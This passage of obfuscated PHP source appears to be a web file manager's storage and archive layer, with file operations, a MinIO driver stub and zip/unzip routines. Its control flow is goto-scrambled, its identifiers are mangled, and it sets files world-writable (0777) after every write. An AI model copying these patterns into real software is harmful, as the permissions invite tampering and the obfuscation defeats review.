(is_dir($d’Á²ÒÀ›½)) { return $this->getPathOuter($d’Á²ÒÀ›½); } @mkdir($d’Á²ÒÀ›½, 511, !0); @chmod($d’Á²ÒÀ›½, 511); return is_dir($d’Á²ÒÀ›½) ? $this->getPathOuter($d’Á²ÒÀ›½) : !1; } public function copyFile($bî®ò“¼İÊ, $BßÀÆÄËÁ¹) { $this->mkdir($this->pathFather($BßÀÆÄËÁ¹)); $bî®ò“¼İÊ = $this->iconvSystem($bî®ò“¼İÊ); $BßÀÆÄËÁ¹ = $this->iconvSystem($BßÀÆÄËÁ¹); $D‘ÛÎƒØˆŒ = copy_64($bî®ò“¼İÊ, $BßÀÆÄËÁ¹); @chmod($BßÀÆÄËÁ¹, 511); return $D‘ÛÎƒØˆŒ ? $this->getPathOuter($BßÀÆÄËÁ¹) : !1; } public function moveFile($aó¥¯ß¥Ü, $e¦Î®ÚÌÊè) { goto EÍ¬†³¿¥æ; fÓ¯¡…ˆ¯à: return $aØ‰˜§µºò ? $this->getPathOuter($e¦Î®ÚÌÊè) : !1; goto d”Šóøª¶†; d–’¨á¡’: $aØ‰˜§µºò = intval(@rename($aó¥¯ß¥Ü, $e¦Î®ÚÌÊè)); if (!$aØ‰˜§µºò) { if ($aØ‰˜§µºò = intval(@copy_64($aó¥¯ß¥Ü, $e¦Î®ÚÌÊè))) { @unlink($aó¥¯ß¥Ü); } } @chmod($e¦Î®ÚÌÊè, 511); goto fÓ¯¡…ˆ¯à; EÍ¬†³¿¥æ: $this->mkdir($this->pathFather($e¦Î®ÚÌÊè)); $aó¥¯ß¥Ü = $this->iconvSystem($aó¥¯ß¥Ü); $e¦Î®ÚÌÊè = $this->iconvSystem($e¦Î®ÚÌÊè); goto d–’¨á¡’; d”Šóøª¶†: } public function delFile($fˆºª›¸¬”) { $fˆºª›¸¬” = $this->iconvSystem($fˆºª›¸¬”); if (!@unlink($fˆºª›¸¬”)) { @chmod($fˆºª›¸¬”, 511); if (!@unlink($fˆºª›¸¬”)) { return !1; } } else { return !0; } } public function delFolder($cÓÆßóñÑ) { goto CÓÖÉâ‚´š; c›ã´Ù²ğà: if (!($d¯ã¤»£á² = opendir($cÓÆßóñÑ))) { return !1; } while (($F¤®¼µœÍÓ = readdir($d¯ã¤»£á²)) !== !1) { if ($F¤®¼µœÍÓ == $Añ½‡ç‘Ó[95] || $F¤®¼µœÍÓ == $Añ½‡ç‘Ó[1273]) { continue; } $Cì¢Ÿ²²ŠÎ = $cÓÆßóñÑ . $Añ½‡ç‘Ó[8] . $F¤®¼µœÍÓ; if (is_file($Cì¢Ÿ²²ŠÎ) || is_link($Cì¢Ÿ²²ŠÎ)) { if (!unlink($Cì¢Ÿ²²ŠÎ)) { chmod($Cì¢Ÿ²²ŠÎ, 511); if (!unlink($Cì¢Ÿ²²ŠÎ)) { return !1; } } } else { if (is_dir($Cì¢Ÿ²²ŠÎ)) { chmod($Cì¢Ÿ²²ŠÎ, 511); $Cì¢Ÿ²²ŠÎ = $this->iconvApp($Cì¢Ÿ²²ŠÎ); if (!$this->delFolder($Cì¢Ÿ²²ŠÎ)) { return !1; } } } } closedir($d¯ã¤»£á²); goto Dë›®¬†´˜; Dë›®¬†´˜: return rmdir($cÓÆßóñÑ); goto CŞİÌìÃ; CÓÖÉâ‚´š: $Añ½‡ç‘Ó =& $_SERVER[ä°„ä°º]; $cÓÆßóñÑ = $this->iconvSystem($cÓÆßóñÑ); if (!is_dir($cÓÆßóñÑ)) { return !0; } goto c›ã´Ù²ğà; CŞİÌìÃ: } public function rename($B¯‡îÀÀ‰µ, $E¼ºã„˜ï‰) { goto DÑ¢³Ğ„¾‹; a«ñöî‰˜: $aòÂŒ©ÂªØ = @rename($B¯‡îÀÀ‰µ, $bÈÓÉÚä¿¹); $bÈÓÉÚä¿¹ = $this->iconvApp($bÈÓÉÚä¿¹); return $aòÂŒ©ÂªØ ? $this->getPathOuter($bÈÓÉÚä¿¹) : !1; goto fºéƒ¤Í¯©; FñÂ•çöƒˆ: $B¯‡îÀÀ‰µ = $this->iconvSystem($B¯‡îÀÀ‰µ); $E‚¯ÕÚâÁŒ = $this->pathFather($B¯‡îÀÀ‰µ); $bÈÓÉÚä¿¹ = rtrim($E‚¯ÕÚâÁŒ, $DâÓÙ¼¥ñ§[8]) . $DâÓÙ¼¥ñ§[8] . $EÒÓ‘¼ÁáÏ; goto a«ñöî‰˜; DÑ¢³Ğ„¾‹: $DâÓÙ¼¥ñ§ =& $_SERVER[ä°„ä°º]; $EÒÓ‘¼ÁáÏ = $this->fileNameAuto($this->pathFather($B¯‡îÀÀ‰µ), $E¼ºã„˜ï‰); $EÒÓ‘¼ÁáÏ = $this->iconvSystem($EÒÓ‘¼ÁáÏ); goto FñÂ•çöƒˆ; fºéƒ¤Í¯©: } public function size($F‡„«ï) { $F‡„«ï = $this->iconvSystem($F‡„«ï); return filesize_64($F‡„«ï); } public function info($DŞ ‡ƒ½Í) { $DŞ ‡ƒ½Í = $this->iconvSystem($DŞ ‡ƒ½Í); if ($this->isFolder($DŞ ‡ƒ½Í)) { return $this->folderInfo($DŞ ‡ƒ½Í); } else { if ($this->isFile($DŞ ‡ƒ½Í)) { return $this->fileInfo($DŞ ‡ƒ½Í); } } return !1; } protected function infoChildren($b‡ÙùõËª, &$b¢›Î°ë•Ô, $d¿´•ùÈåœ = true) { goto cœ³ÆöŸ¯æ; cœ³ÆöŸ¯æ: $A…±Ë–Üß =& $_SERVER[ä°„ä°º]; check_abort_echo(); $b‡ÙùõËª = rtrim($b‡ÙùõËª, $A…±Ë–Üß[8]) . $A…±Ë–Üß[8]; goto A¼£ºˆ¡×; f‘¹’Šˆ‰†: closedir($Bƒ¯‰‚ğ÷Ñ); goto BÉÉë²õ´; A¼£ºˆ¡×: if ($d¿´•ùÈåœ) { $b‡ÙùõËª = $this->iconvSystem($b‡ÙùõËª); } if (!($Bƒ¯‰‚ğ÷Ñ = @opendir($b‡ÙùõËª))) { return; } while (($EòÏÆ«“ŒÄ = readdir($Bƒ¯‰‚ğ÷Ñ)) !== !1) { if ($EòÏÆ«“ŒÄ == $A…±Ë–Üß[95] || $EòÏÆ«“ŒÄ == $A…±Ë–Üß[1273]) { continue; } $a°†ãù—˜ = $b‡ÙùõËª . $EòÏÆ«“ŒÄ; if (is_file($a°†ãù—˜) || is_link($a°†ãù—˜)) { $b¢›Î°ë•Ô[$A…±Ë–Üß[79]]++; $b¢›Î°ë•Ô[$A…±Ë–Üß[78]] += filesize_64($a°†ãù—˜); } else { if (is_dir($a°†ãù—˜)) { $b¢›Î°ë•Ô[$A…±Ë–Üß[80]]++; $this->infoChildren($a°†ãù—˜, $b¢›Î°ë•Ô, !1); } } } goto f‘¹’Šˆ‰†; BÉÉë²õ´: } private function folderInfo($fóœ‘˜„Ê», $cº˜¦·ßåî = false) { $aßğ¬Ç =& $_SERVER[ä°„ä°º]; $fóœ‘˜„Ê» = rtrim($fóœ‘˜„Ê», $aßğ¬Ç[8]) . $aßğ¬Ç[8]; $c¾»»„òó§ = $this->iconvApp($this->pathThis($fóœ‘˜„Ê»)); if ($cº˜¦·ßåî) { return array($aßğ¬Ç[28] => $c¾»»„òó§, $aßğ¬Ç[76] => $this->getPathOuter($fóœ‘˜„Ê»), $aßğ¬Ç[29] => $aßğ¬Ç[77]); } $fğô½à¥×÷ = array($aßğ¬Ç[28] => $c¾»»„òó§, $aßğ¬Ç[76] => $this->getPathOuter($fóœ‘˜„Ê»), $aßğ¬Ç[29] => $aßğ¬Ç[77], $aßğ¬Ç[194] => @filectime($fóœ‘˜„Ê»), $aßğ¬Ç[84] => @filemtime($fóœ‘˜„Ê»), $aßğ¬Ç[1276] => @fileatime($fóœ‘˜„Ê»), $aßğ¬Ç[1277] => is_readable($fóœ‘˜„Ê»), $aßğ¬Ç[1278] => is_writable($fóœ‘˜„Ê»), $aßğ¬Ç[1279] => get_mode($fóœ‘˜„Ê»)); return $fğô½à¥×÷; } private function fileInfo($b²“êİÇ, $bÂÆêóäãì = false) { $dÒÁŸñØ‚  =& $_SERVER[ä°„ä°º]; $A“çìØóËÙ = $this->iconvApp($this->pathThis($b²“êİÇ)); if ($bÂÆêóäãì) { return array($dÒÁŸñØ‚ [28] => $A“çìØóËÙ, $dÒÁŸñØ‚ [76] => $this->getPathOuter($b²“êİÇ), $dÒÁŸñØ‚ [29] => $dÒÁŸñØ‚ [193], $dÒÁŸñØ‚ [78] => $this->size($b²“êİÇ), $dÒÁŸñØ‚ [168] => $this->ext($A“çìØóËÙ)); } $bÚ¡‚·’„Ë = array($dÒÁŸñØ‚ [28] => $A“çìØóËÙ, $dÒÁŸñØ‚ [76] => $this->getPathOuter($b²“êİÇ), $dÒÁŸñØ‚ [29] => $dÒÁŸñØ‚ [193], $dÒÁŸñØ‚ [194] => @filectime($b²“êİÇ), $dÒÁŸñØ‚ [84] => @filemtime($b²“êİÇ), $dÒÁŸñØ‚ [1276] => @fileatime($b²“êİÇ), $dÒÁŸñØ‚ [78] => $this->size($b²“êİÇ), $dÒÁŸñØ‚ [168] => $this->ext($A“çìØóËÙ), $dÒÁŸñØ‚ [1277] => is_readable($b²“êİÇ), $dÒÁŸñØ‚ [1278] => is_writable($b²“êİÇ), $dÒÁŸñØ‚ [1279] => get_mode($b²“êİÇ)); return $bÚ¡‚·’„Ë; } public function exist($dÑÆ©ÔÍ«¹) { $dÑÆ©ÔÍ«¹ = $this->iconvSystem($dÑÆ©ÔÍ«¹); return @file_exists($dÑÆ©ÔÍ«¹); } public function isFile($cÉäøÛ‘ç) { $cÉäøÛ‘ç = $this->iconvSystem($cÉäøÛ‘ç); return @is_file($cÉäøÛ‘ç); } public function isFolder($D¬¬¬‰èè°) { $D¬¬¬‰èè° = $this->iconvSystem($D¬¬¬‰èè°); return @is_dir($D¬¬¬‰èè°); } public function listPath($D½‹«»­†, $BØÎ¿½²¢Ô = false) { goto b·˜³Š«•ë; FòŸÀ¼ğµß: $Aáòä¹åŠË = array($B‚ò¥ïÃä‰[75] => array(), $B‚ò¥ïÃä‰[74] => array()); if (!($e¥ÅÌì‰± = @opendir($D½‹«»­†))) { return $Aáòä¹åŠË; } while (($FÍÌ¢öÉö = readdir($e¥ÅÌì‰±)) !== !1) { if ($FÍÌ¢öÉö == $B‚ò¥ïÃä‰[95] || $FÍÌ¢öÉö == $B‚ò¥ïÃä‰[1273]) { continue; } $FäÖ×Ÿòèí = $D½‹«»­† . $FÍÌ¢öÉö; if (is_file($FäÖ×Ÿòèí)) { $Aáòä¹åŠË[$B‚ò¥ïÃä‰[74]][] = $this->fileInfo($FäÖ×Ÿòèí, $BØÎ¿½²¢Ô); } else { $Aáòä¹åŠË[$B‚ò¥ïÃä‰[75]][] = $this->folderInfo($FäÖ×Ÿòèí, $BØÎ¿½²¢Ô); } } goto FÈøæÉƒµ; FÈøæÉƒµ: closedir($e¥ÅÌì‰±); return $Aáòä¹åŠË; goto CÆÜìµ»¸; b·˜³Š«•ë: $B‚ò¥ïÃä‰ =& $_SERVER[ä°„ä°º]; $D½‹«»­† = $this->iconvSystem($D½‹«»­†); $D½‹«»­† = rtrim($D½‹«»­†, $B‚ò¥ïÃä‰[8]) . $B‚ò¥ïÃä‰[8]; goto FòŸÀ¼ğµß; CÆÜìµ»¸: } public function listAll($c«ƒ¿ÛğçÌ, &$eÄ”ÕŞïÆË = array()) { goto C‡àÈ¼‘Â©; C‡àÈ¼‘Â©: $EøÆ…ó‹ =& $_SERVER[ä°„ä°º]; $c«ƒ¿ÛğçÌ = $this->iconvSystem($c«ƒ¿ÛğçÌ); $c«ƒ¿ÛğçÌ = rtrim($c«ƒ¿ÛğçÌ, $EøÆ…ó‹[8]) . $EøÆ…ó‹[8]; goto CÎĞİƒ¹©; CÎĞİƒ¹©: if (!($b§—á™ÄÈ™ = @opendir($c«ƒ¿ÛğçÌ))) { return $eÄ”ÕŞïÆË; } while (($AÔóƒ­±Êä = readdir($b§—á™ÄÈ™)) !== !1) { if ($AÔóƒ­±Êä == $EøÆ…ó‹[95] || $AÔóƒ­±Êä == $EøÆ…ó‹[1273]) { continue; } $BôåÓ£© = $c«ƒ¿ÛğçÌ . $AÔóƒ­±Êä; if (is_dir($BôåÓ£©) && !is_link($BôåÓ£©)) { $eÄ”ÕŞïÆË[] = array($EøÆ…ó‹[76] => $BôåÓ£© . $EøÆ…ó‹[8], $EøÆ…ó‹[77] => 1, $EøÆ…ó‹[84] => @filemtime($BôåÓ£©), $EøÆ…ó‹[78] => 0); $this->listAll($BôåÓ£©, $eÄ”ÕŞïÆË); } else { $eÄ”ÕŞïÆË[] = array($EøÆ…ó‹[76] => $BôåÓ£©, $EøÆ…ó‹[77] => 0, $EøÆ…ó‹[84] => @filemtime($BôåÓ£©), $EøÆ…ó‹[78] => $this->size($BôåÓ£©)); } } closedir($b§—á™ÄÈ™); goto EÄ‰´ƒä‚; EÄ‰´ƒä‚: return $eÄ”ÕŞïÆË; goto F©æ¦ˆ…ÆÏ; F©æ¦ˆ…ÆÏ: } public function has($fÕõ½ÅÃèÇ, $dñÖŠŠµÊ¯ = false, $D¸®œ…›ìã = true) { goto BÇÕ½ÄÖ™°; c¸Ÿ³õĞÙ•: $bŸÅêô†ß¶ = 0; while (($dëïëç£ŒÕ = readdir($C­Ó†µÇ¢)) !== !1) { if ($dëïëç£ŒÕ == $Dó¼Â§ÎÜ†[95] || $dëïëç£ŒÕ == $Dó¼Â§ÎÜ†[1273]) { continue; } $Bë¦æ•ˆ‰ = $fÕõ½ÅÃèÇ . $dëïëç£ŒÕ; if ($dñÖŠŠµÊ¯) { $bŸÅêô†ß¶++; if (@is_file($Bë¦æ•ˆ‰)) { $F£îÌêÆ¸ò++; } else { $Bø‡ØÍÇ‰÷++; } if ($bŸÅêô†ß¶ > 10000) { break; } continue; } if ($D¸®œ…›ìã) { if (@is_file($Bë¦æ•ˆ‰)) { return !0; } } else { if (@is_dir($Bë¦æ•ˆ‰ . $Dó¼Â§ÎÜ†[8])) { return !0; } } } closedir($C­Ó†µÇ¢); goto Dí¾½ôÖ·Ô; BÇÕ½ÄÖ™°: $Dó¼Â§ÎÜ† =& $_SERVER[ä°„ä°º]; $fÕõ½ÅÃèÇ = $this->iconvSystem($fÕõ½ÅÃèÇ); $fÕõ½ÅÃèÇ = rtrim($fÕõ½ÅÃèÇ, $Dó¼Â§ÎÜ†[8]) . $Dó¼Â§ÎÜ†[8]; goto cìšßÆÍÜƒ; Dí¾½ôÖ·Ô: if ($dñÖŠŠµÊ¯) { return array($Dó¼Â§ÎÜ†[203] => $F£îÌêÆ¸ò, $Dó¼Â§ÎÜ†[204] => $Bø‡ØÍÇ‰÷); } return !1; goto Eç¡ÙÎ„íç; cìšßÆÍÜƒ: if (!($C­Ó†µÇ¢ = @opendir($fÕõ½ÅÃèÇ))) { return !1; } $F£îÌêÆ¸ò = 0; $Bø‡ØÍÇ‰÷ = 0; goto c¸Ÿ³õĞÙ•; Eç¡ÙÎ„íç: } public function hashSimple($cä—ñÖãË) { goto C¨ŞŠ İê; EŒ‹êñ·±÷: $F¿ÒæŞŒ˜° = fopen($cä—ñÖãË, $Bº‘“ë¢˜‹[1280]); if (!$F¿ÒæŞŒ˜°) { return $AËÜñ–´´‚; } for ($B‡ê¿§ã§¤ = 0; $B‡ê¿§ã§¤ < $fò ¡ò¾Š²; $B‡ê¿§ã§¤++) { fseek_64($F¿ÒæŞŒ˜°, $BÖùš÷À’ù * $B‡ê¿§ã§¤); $AËÜñ–´´‚ .= fread($F¿ÒæŞŒ˜°, $cÅ•â´•…½); } goto AèÊÕ¬Ó–µ; a™†åÍ¢×Š: $b¢¬åšÙùÃ = $this->size($cä—ñÖãË); $cÅ•â´•…½ = 200; $fò ¡ò¾Š² = 50; goto A¸ğÍµ¶Í; cõÈª‡·ÒÇ: return md5($AËÜñ–´´‚) . $b¢¬åšÙùÃ; goto Bõ‰ğƒŸ²; A¸ğÍµ¶Í: if ($b¢¬åšÙùÃ <= $cÅ•â´•…½ * $fò ¡ò¾Š²) { return $this->hashMd5($cä—ñÖãË) . $b¢¬åšÙùÃ; } $AËÜñ–´´‚ = $Bº‘“ë¢˜‹[33]; $BÖùš÷À’ù = intval($b¢¬åšÙùÃ / $fò ¡ò¾Š²); goto EŒ‹êñ·±÷; AèÊÕ¬Ó–µ: fseek_64($F¿ÒæŞŒ˜°, $b¢¬åšÙùÃ - $cÅ•â´•…½); $AËÜñ–´´‚ .= fread($F¿ÒæŞŒ˜°, $cÅ•â´•…½); fclose($F¿ÒæŞŒ˜°); goto cõÈª‡·ÒÇ; C¨ŞŠ İê: $Bº‘“ë¢˜‹ =& $_SERVER[ä°„ä°º]; if (!$cä—ñÖãË) { return md5($Bº‘“ë¢˜‹[33]); } $cä—ñÖãË = $this->iconvSystem($cä—ñÖãË); goto a™†åÍ¢×Š; Bõ‰ğƒŸ²: } public function getContent($Aè½Ì¯ˆ“Ü) { $Aè½Ì¯ˆ“Ü = $this->iconvSystem($Aè½Ì¯ˆ“Ü); return file_get_contents($Aè½Ì¯ˆ“Ü); } public function setContent($fß±ÉŞË¡×, $eèºã¨ÉØ‘ = '') { $fß±ÉŞË¡× = $this->iconvSystem($fß±ÉŞË¡×); $aö¥£©°ëÎ = @file_put_contents($fß±ÉŞË¡×, $eèºã¨ÉØ‘, LOCK_EX); clearstatcache(); @chmod($fß±ÉŞË¡×, 511); return $aö¥£©°ëÎ === !1 ? !1 : !0; } public function fileSubstr($EàÂ„÷„‹Ò, $bæâƒÆùÇ = 0, $b´¾‰¨·ö… = false) { goto dÉ½äÕ‹›; bË«¿¥ààƒ: fseek_64($EõËŞ‘Õğô, $bæâƒÆùÇ); $Bƒ´Ô³ÒÒ² = fread($EõËŞ‘Õğô, $b´¾‰¨·ö…); fclose($EõËŞ‘Õğô); goto B½¥ÃØ©¤î; dÉ½äÕ‹›: $a¼«ÏÖçæ’ =& $_SERVER[ä°„ä°º]; $EàÂ„÷„‹Ò = $this->iconvSystem($EàÂ„÷„‹Ò); if ($b´¾‰¨·ö… === !1) { $b´¾‰¨·ö… = $this->size($EàÂ„÷„‹Ò); } goto bÂ¹ÔÕÍŒÈ; B½¥ÃØ©¤î: return $Bƒ´Ô³ÒÒ²; goto cƒã˜ƒÕÉ‚; bÂ¹ÔÕÍŒÈ: if ($b´¾‰¨·ö… <= 0) { return $a¼«ÏÖçæ’[33]; } $EõËŞ‘Õğô = fopen($EàÂ„÷„‹Ò, $a¼«ÏÖçæ’[1280]); if (!$EõËŞ‘Õğô) { return !1; } goto bË«¿¥ààƒ; cƒã˜ƒÕÉ‚: } public function upload($Bø˜†‰¡…¢, $DÜé§‡¾Æ», $A¬Ø¤•­ó¶ = false, $bòîœ¥‰ƒä = REPEAT_REPLACE) { if ($A¬Ø¤•­ó¶) { return $this->moveFile($DÜé§‡¾Æ», $Bø˜†‰¡…¢); } return $this->copyFile($DÜé§‡¾Æ», $Bø˜†‰¡…¢); } public function setModifyTime($b²‚ï©Ïß™, $bö“˜±·®¨ = '') { @touch($b²‚ï©Ïß™, intval($bö“˜±·®¨)); } public function download($d²ÍîÚÈî—, $BáÃ°ÀŞŸ„) { return $this->iconvSystem($d²ÍîÚÈî—); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($b½…Ñ‰Œ†¥) { parent::__construct($b½…Ñ‰Œ†¥); $this->signatureVersion($_SERVER[ä°„ä°º][212]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto c¹Èª†ÀÆ; f§¤ĞÚ¹: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $f°ËŞ¢ŞÔ; if (!$f°ËŞ¢ŞÔ) { $aÎÁëÜ¥¤Ÿ = IO::init($_SERVER[ä°„ä°º][8]); } return $aÎÁëÜ¥¤Ÿ; } private static function iconvSystem($eé‰Èì­í) { return self::local()->iconvSystem($eé‰Èì­í); } private static function iconvApp($E¤…Š …·Ì) { return self::local()->iconvApp($E¤…Š …·Ì); } public static function zip($f‚¼äÈÇåæ, $aÓ‹íîæ¦ï = "\172\151\x70", $aêç‰‡ÏÉ = '', $aßÄ“†°¦Š = REPEAT_RENAME) { goto F‚®Á“¨ƒÀ; bÙöÊ‹’ëÃ: if (!$FÄÉİÎ²Â¬) { del_dir($dê…‹àµ³Ş); show_json(LNG($d¶ƒ¤ù•Ñç[1102]), !1); } del_dir($dê…‹àµ³Ş); return $FÄÉİÎ²Â¬; goto DŠÌšøù«á; FÔÒÒ†Ô : if (count($c™»µ—Í¯) > 1) { $B„‰‡Ç„øò = IO::info(IO::pathFather($d›‚öèÌ¤–[$d¶ƒ¤ù•Ñç[76]])); $BİÉÚ·ìï– = $B„‰‡Ç„øò[$d¶ƒ¤ù•Ñç[28]]; } $cíè…¬¨ª = $dê…‹àµ³Ş; if (!$cíè…¬¨ª) { $cíè…¬¨ª = get_path_father($d›‚öèÌ¤–[$d¶ƒ¤ù•Ñç[76]]); if (!$aêç‰‡ÏÉ && $a¡®ˆë“ÇÎ->getType() == $d¶ƒ¤ù•Ñç[106]) { $cíè…¬¨ª = get_path_father($a¡®ˆë“ÇÎ->path); } $C˜ÇôóŠÓ = IO::info($cíè…¬¨ª); if (!$C˜ÇôóŠÓ[$d¶ƒ¤ù•Ñç[196]]) { show_json(LNG($d¶ƒ¤ù•Ñç[1101]), !1); } } goto dÁÃ…Ô×Æ; DÆêèõÎ»: $dê…‹àµ³Ş = !1; if (!$aêç‰‡ÏÉ && $a¡®ˆë“ÇÎ->getType() == $d¶ƒ¤ù•Ñç[106]) { $c™»µ—Í¯ = self::zipFileList($f‚¼äÈÇåæ); } else { $dê…‹àµ³Ş = $aêç‰‡ÏÉ ? $aêç‰‡ÏÉ : TEMP_FILES . $d¶ƒ¤ù•Ñç[1100] . time() . rand_string(8) . $d¶ƒ¤ù•Ñç[8]; mk_dir($dê…‹àµ³Ş); $c™»µ—Í¯ = self::zipFileList($f‚¼äÈÇåæ, $dê…‹àµ³Ş); } $BİÉÚ·ìï– = $d›‚öèÌ¤–[$d¶ƒ¤ù•Ñç[28]]; goto FÔÒÒ†Ô ; dÁÃ…Ô×Æ: $déƒÍµ“šÃ = $cíè…¬¨ª . $BİÉÚ·ìï– . $d¶ƒ¤ù•Ñç[95] . $aÓ‹íîæ¦ï; $déƒÍµ“šÃ = get_filename_auto($déƒÍµ“šÃ, $d¶ƒ¤ù•Ñç[33], $aßÄ“†°¦Š); $AôÍÜ‚Û·ø = self::iconvSystem($déƒÍµ“šÃ); goto C¬®  à©é; C¬®  à©é: foreach ($c™»µ—Í¯ as $AÇ‡È‰İ™Â => $AÀã³êØŞ³) { $c™»µ—Í¯[$AÇ‡È‰İ™Â] = self::iconvSystem($AÀã³êØŞ³); } KodArchive::create($AôÍÜ‚Û·ø, $c™»µ—Í¯); if (!IO::exist($déƒÍµ“šÃ)) { if ($dê…‹àµ³Ş) { del_dir($dê…‹àµ³Ş); } show_json(LNG($d¶ƒ¤ù•Ñç[1102]), !1); } goto Có·¯¡¬èæ; F‚®Á“¨ƒÀ: $d¶ƒ¤ù•Ñç =& $_SERVER[ä°„ä°º]; $a¡®ˆë“ÇÎ = self::init($f‚¼äÈÇåæ[0][$d¶ƒ¤ù•Ñç[76]]); $d›‚öèÌ¤– = self::info($f‚¼äÈÇåæ[0][$d¶ƒ¤ù•Ñç[76]]); goto DÆêèõÎ»; Có·¯¡¬èæ: if ($aêç‰‡ÏÉ || !$dê…‹àµ³Ş) { if ($dê…‹àµ³Ş && strstr($dê…‹àµ³Ş, TEMP_FILES)) { $EŸœ‰ˆÒ­õ = $c™»µ—Í¯ = array(); recursion_dir($cíè…¬¨ª, $EŸœ‰ˆÒ­õ, $c™»µ—Í¯, 0); foreach ($EŸœ‰ˆÒ­õ as $c„ï‡Ë„Ê) { del_dir($c„ï‡Ë„Ê); } foreach ($c™»µ—Í¯ as $dÜ´‚ÃÉİ´) { if ($dÜ´‚ÃÉİ´ == $AôÍÜ‚Û·ø) { continue; } del_file($dÜ´‚ÃÉİ´); } } return $déƒÍµ“šÃ; } $dÕ£¿‚‹Õ = self::pathFather($d›‚öèÌ¤–[$d¶ƒ¤ù•Ñç[76]]); $FÄÉİÎ²Â¬ = self::move($déƒÍµ“šÃ, $dÕ£¿‚‹Õ, $aßÄ“†°¦Š); goto bÙöÊ‹’ëÃ; DŠÌšøù«á: } public static function unzip($eÆš¥Ò¬³º, $f¦Ç‡êÇÍÛ = "\x72\145\x70\x6c\x61\x63\145") { goto bÒÓ‘ôäÏ; bÒÓ‘ôäÏ: $C‚¤ğ—•”† =& $_SERVER[ä°„ä°º]; $BäË¼‡©“• = $eÆš¥Ò¬³º[$C‚¤ğ—•”†[76]]; $EöêõÜµïç = $eÆš¥Ò¬³º[$C‚¤ğ—•”†[1103]]; goto f‹åØêªê¦; C¿éÄ“¤Ø: return !0; goto f¼´ÙêîĞ•; F©ÊŠÎÃôâ: $c¬¨ªò¦”Å = self::tmpFileName($E•’º³é¢Ä); $aŸÓ‚¥©“‚ = TEMP_FILES . $c¬¨ªò¦”Å; del_dir($aŸÓ‚¥©“‚); goto AÑİÂæØ¦á; eõÓŠ—‘ô: foreach ($A„ùˆ­¶í as $aŒÎÅ¸à) { $aŒÎÅ¸à = self::iconvApp($aŒÎÅ¸à); self::move($aŒÎÅ¸à, $EöêõÜµïç, $f¦Ç‡êÇÍÛ); } del_dir($aŸÓ‚¥©“‚); if (!$b¸‰¼ØÔ¢Ú) { del_file($cÌì¹…Îä§); } goto C¿éÄ“¤Ø; f‹åØêªê¦: if (!($E•’º³é¢Ä = parent::info($BäË¼‡©“•))) { show_json(LNG($C‚¤ğ—•”†[1104]), !1); } if (!($d®æø©Í¿° = parent::infoFull($EöêõÜµïç))) { $EöêõÜµïç = parent::mkdir($EöêõÜµïç); $d®æø©Í¿° = array($C‚¤ğ—•”†[76] => $EöêõÜµïç); } else { if (isset($d®æø©Í¿°[$C‚¤ğ—•”†[395]]) && trim($d®æø©Í¿°[$C‚¤ğ—•”†[76]], $C‚¤ğ—•”†[8]) != trim($EöêõÜµïç, $C‚¤ğ—•”†[8])) { $aÈ»ĞãÆÏÏ = KodIO::make($d®æø©Í¿°[$C‚¤ğ—•”†[478]]); $BÏŠ»áÂº = parent::fileNameAuto($aÈ»ĞãÆÏÏ, $d®æø©Í¿°[$C‚¤ğ—•”†[28]], REPEAT_RENAME_FOLDER, !0); $EöêõÜµïç = parent::mkdir($aÈ»ĞãÆÏÏ . $BÏŠ»áÂº); $d®æø©Í¿° = array($C‚¤ğ—•”†[76] => $EöêõÜµïç); } } $EöêõÜµïç = $d®æø©Í¿°[$C‚¤ğ—•”†[76]]; goto F©ÊŠÎÃôâ; CÉ•Ê¨¬Î: Hook::trigger($C‚¤ğ—•”†[1110], $aŸÓ‚¥©“‚); recursion_dir($aŸÓ‚¥©“‚, $Dí›Î…É˜, $e„ËÌêÁŞ³, 0); $A„ùˆ­¶í = array_merge($Dí›Î…É˜, $e„ËÌêÁŞ³); goto eõÓŠ—‘ô; AÑİÂæØ¦á: mk_dir($aŸÓ‚¥©“‚); $EäÆ˜­å´ = self::fileExt($E•’º³é¢Ä); $cÌì¹…Îä§ = $aŸÓ‚¥©“‚ . $C‚¤ğ—•”†[95] . $EäÆ˜­å´; goto b’°ÚÑéÙ•; b’°ÚÑéÙ•: if (!@file_exists(self::iconvSystem($cÌì¹…Îä§))) { $b¸‰¼ØÔ¢Ú = self::localFilePath($BäË¼‡©“•, $EäÆ˜­å´); $cÌì¹…Îä§ = $b¸‰¼ØÔ¢Ú ? $b¸‰¼ØÔ¢Ú : parent::download($BäË¼‡©“•, $cÌì¹…Îä§); } $cÌì¹…Îä§ = self::iconvSystem($cÌì¹…Îä§); $AÉ´Á©¦Ê„ = isset($eÆš¥Ò¬³º[$C‚¤ğ—•”†[1105]]) ? $eÆš¥Ò¬³º[$C‚¤ğ—•”†[1105]] : $C‚¤ğ—•”†[1106]; goto FØÈØÏÜ¸; FØÈØÏÜ¸: $Bä¢İ‚œí‹ = KodArchive::extract($cÌì¹…Îä§, $aŸÓ‚¥©“‚ . $C‚¤ğ—•”†[8], $AÉ´Á©¦Ê„); self::archiveExt(); if (!$Bä¢İ‚œí‹[$C‚¤ğ—•”†[1107]]) { show_json($C‚¤ğ—•”†[1108] . $Bä¢İ‚œí‹[$C‚¤ğ—•”†[1109]], !1); } goto CÉ•Ê¨¬Î; f¼´ÙêîĞ•: } public static function unzipList($FõÔöĞì‡ƒ) { goto A‚åéÚ°; b‚’§¸İêÙ: $Eï¿Ÿºç»© = self::info($EˆÀ×¼Œæ); $EÚˆ·ÔèÛ¡ = self::fileExt($Eï¿Ÿºç»©); $EâÑ‘ç‹²‘ = self::tmpFileName($Eï¿Ÿºç»©); goto cñ©ê…¬£; A‚åéÚ°: $DÙÎËîØ„ =& $_SERVER[ä°„ä°º]; $C‘ó®Ú©‡ = $FõÔöĞì‡ƒ[$DÙÎËîØ„[76]]; $c…äÏŒö„ = isset($FõÔöĞì‡ƒ[$DÙÎËîØ„[1111]]) ? $FõÔöĞì‡ƒ[$DÙÎËîØ„[1111]] : -1; goto Aà¦­ˆ¸Ñ; A¨ÇŸº“: if (!is_dir($fƒ¿‚ò—Á)) { mk_dir($fƒ¿‚ò—Á); } $f—Œ²öÏéí = $fƒ¿‚ò—Á . $DÙÎËîØ„[8] . $fß´å½É‡Ú; if (!@file_exists(self::iconvSystem($f—Œ²öÏéí))) { if (isset($Eª”Å†·„‚)) { url_request($C‘ó®Ú©‡, $DÙÎËîØ„[1114], $f—Œ²öÏéí); } else { $fÄÃ¬²·ğ = self::localFilePath($C‘ó®Ú©‡, 